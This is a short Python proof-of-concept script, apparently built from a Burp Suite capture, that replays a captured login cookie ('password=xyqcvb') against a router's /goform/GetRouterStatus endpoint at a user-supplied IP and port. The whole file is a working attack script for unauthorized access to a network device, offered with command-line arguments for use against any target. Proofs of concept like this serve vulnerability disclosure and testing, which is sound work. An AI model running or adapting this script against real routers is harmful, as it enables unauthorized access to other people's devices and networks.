import argparse
import requests

def replay_login(ip, port):
    burp0_url = f"http://{ip}:{port}/goform/GetRouterStatus?0.9854319899874517&_=1729406047322"
    burp0_cookies = {"password": "xyqcvb"}
    burp0_headers = {"X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept": "text/plain, */*; q=0.01", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36", "Referer": "http://192.168.33.166:33252/main.html", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Replay login script')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', required=True, help='Target port')
    args = parser.parse_args()
    replay_login(args.ip, args.port)
